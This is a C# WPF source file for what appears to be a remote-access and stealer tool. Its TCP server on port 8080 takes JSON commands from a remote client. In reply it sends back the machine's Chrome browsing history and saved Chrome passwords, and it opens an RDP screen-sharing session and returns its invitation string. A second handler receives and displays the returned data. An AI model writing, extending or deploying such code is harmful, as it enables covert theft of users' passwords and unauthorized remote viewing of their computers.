using System;
using System.Data;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using Newtonsoft.Json;
using System.Threading;
using System.Windows.Media;
using System.Collections.Generic;
using System.Diagnostics;
using RDPCOMAPILib;
using MSTSCLib;


namespace WpfApp3
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        Thread myThread = null;
        RDPSession x = new RDPSession();
        public MainWindow()
        {
            InitializeComponent();
        }

        private void IncomingRDPCall(object guest)
        {
            IRDPSRAPIAttendee myGuest = (IRDPSRAPIAttendee)guest;
            //myGuest.ControlLevel = CTRL_LEVEL.CTRL_LEVEL_INTERACTIVE;
            myGuest.ControlLevel = CTRL_LEVEL.CTRL_LEVEL_VIEW;
        }

        private async void btnCONNECT_Click(object sender, RoutedEventArgs e)
        {
            const int PORT_NO = 8080;
            const string SERVER_IP = "127.0.0.1";

            await this.Dispatcher.InvokeAsync((Action)(() =>
             {
                 //The ip and port parameters.
                 string ip = "10.0.0.8";
                 int port = 8080;
                 bool flag = true;

                 //---listen at the specified IP and port no.---
                 IPAddress localAdd = IPAddress.Parse(ip);
                 TcpListener listener = new TcpListener(localAdd, port);
                 listener.Start();

                 for (int i = 0; i < 1; i++)
                 {
                     //---get the incoming data through a network stream---
                     try
                     {
                         TcpClient client = listener.AcceptTcpClient();
                         NetworkStream nwStream = client.GetStream();

                         byte[] buffer = new byte[client.ReceiveBufferSize];

                         //---read incoming stream---
                         int bytesRead = nwStream.Read(buffer, 0, client.ReceiveBufferSize);

                         //---convert the data received into a string---
                         string dataReceived = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                         DataTable message = JsonConvert.DeserializeObject<DataTable>(dataReceived);

                         gv.ItemsSource = message.AsDataView();

                         System.Windows.MessageBox.Show($@"Done. Found {message.Rows.Count} rows.");

                         //Thread.Sleep(3000);
                     }
                     catch
                     {

                     }
                 }
             }));

        }

        private void gv_LoadingRow(object sender, System.Windows.Controls.DataGridRowEventArgs e)
        {
            //try
            //{
            //    DataRowView item = e.Row.Item as DataRowView;
            //    if (item != null)
            //    {
            //        if (item.Row[4].ToString() != "")
            //        {

            //        }
            //        if (item.Row["url"].ToString().Contains("overflow"))
            //        {
            //            e.Row.Background = Brushes.BlanchedAlmond;
            //        }
            //    }
            //}
            //catch(Exception ex)
            //{
            //    MessageBox.Show(ex.ToString());
            //}
            //if (row.DataContext.ToString().Contains("overflow"))
            //{
            //    MessageBox.Show("Found !");
            //}
        }

        private void gv_Loaded(object sender, RoutedEventArgs e)
        {
            //var r = e.Source;
        }

        private void gv_UnloadingRow(object sender, System.Windows.Controls.DataGridRowEventArgs e)
        {
            if (e.Row.DataContext.ToString().Contains("overflow"))
            {
                e.Row.Background = Brushes.AliceBlue;
            }
        }

        protected string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("Local IP Address Not Found!");
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if (myThread == null)
            {
                try
                {
                    lblIPAddress.Content = "Your IP Address is\n"+ GetLocalIPAddress();
                    myThread = new Thread(Server);
                    MessageBox.Show("Server is running !");
                    myThread.Start();
                }
                catch
                {
                    MessageBox.Show("Unable to start server ! ");
                }
            }
            else
            {
                MessageBox.Show("The server is already running !", "Server Alive", MessageBoxButton.OK, MessageBoxImage.Information);
            }
        }
        protected async void Server()
        {
            //Start RDP Session
            string rdp = StartRDP();
            Thread.Sleep(5000);


            //The ip and port parameters.
            string ip = "10.0.0.8";
            int port = 8080;
            bool flag = true;

            //---listen at the specified IP and port no.---
            IPAddress localAdd = IPAddress.Parse(GetLocalIPAddress());
            TcpListener listener = new TcpListener(localAdd, port);
            listener.Start();


            //---get the incoming data through a network stream---
            while (flag)
            {
                try
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    NetworkStream nwStream = client.GetStream();

                    byte[] buffer = new byte[client.ReceiveBufferSize];

                    //---read incoming stream---
                    int bytesRead = await nwStream.ReadAsync(buffer, 0, client.ReceiveBufferSize);

                    //---convert the data received into a string---
                    string dataReceived = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    dynamic message = JsonConvert.DeserializeObject(dataReceived);


                    //Builds a new dictionary for the return message.
                    Dictionary<string, string> msg = new Dictionary<string, string>();
                    //Dictionary<string, DictionaryHelper<string, DataTable>> msg = new Dictionary<string, DictionaryHelper<string, DataTable>>();
                    string result;
                    bool fl = false;
                    switch ((string)message.Command)
                    {
                        #region History
                        case "History":
                            DataTable dt = await Chrome_History.GetChromeHistoryDataAsync();
                            if (dt == null)
                            {
                                msg.Add("STATUS", "ERROR");
                                msg.Add("HistoryResult", null);
                            }
                            else if (dt != null)
                            {
                                msg.Add("STATUS", "OK");
                                msg.Add("HistoryResult", JsonConvert.SerializeObject(dt));
                            }
                            break;
                        #endregion
                        case "Passwords":
                            DataTable dt2 = await Chrome_Passwords.GetPasswordsAsync();
                            if (dt2 == null)
                            {
                                msg.Add("STATUS", "ERROR");
                                msg.Add("PasswordsResult", null);
                            }
                            else if (dt2 != null)
                            {
                                msg.Add("STATUS", "OK");
                                msg.Add("PasswordsResult", JsonConvert.SerializeObject(dt2));
                            }
                            break;
                        case "Shut_Down":
                            msg.Add("STATUS", "OK");
                            fl = true;
                            //myThread.Abort();
                            //Application.Current.Shutdown();
                            //Close();
                            break;
                        case "RDP_SESSION":
                            msg.Add("STATUS", "OK");
                            msg.Add("CONNSTRING", rdp);
                            break;
                        default:
                            break;
                    }
                    result = JsonConvert.SerializeObject(msg);

                    //Sends the Json-string to the client.
                    byte[] buffers = Encoding.UTF8.GetBytes(result);
                    nwStream.Write(buffers, 0, buffers.Length);
                    client.Close();
                    Debug.Write("Client closed...");


                    //myThread.Abort();
                    if(fl)
                    Dispatcher.Invoke(() =>
                    {
                        {
                            try
                            {
                                foreach (var process in Process.GetProcessesByName("WpfApp3"))
                                {
                                    process.Kill();
                                }
                                Close();
                                Application.Current.Shutdown();
                            }
                            catch(Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                            }
                        }
                    });
                }
                catch(Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
        }

        protected string StartRDP()
        {
            x.OnAttendeeConnected += IncomingRDPCall;
            x.Open();
            RDPSRAPIInvitation Invitation = x.Invitations.CreateInvitation("Trial", "MyGroup", "", 10);
            //TextBox1.Text = Invitation.ConnectionString;
            return Invitation.ConnectionString;
        }

        private void Button1_Click(object sender, RoutedEventArgs e)
        {
            x.OnAttendeeConnected += IncomingRDPCall;
            x.Open();
        }

        private void Button2_Click(object sender, RoutedEventArgs e)
        {
            RDPSRAPIInvitation Invitation = x.Invitations.CreateInvitation("Trial", "MyGroup", "", 10);
            TextBox1.Text = Invitation.ConnectionString;
        }

        private void Button3_Click(object sender, RoutedEventArgs e)
        {
            x.Close();
            x = null;
        }
    }
}
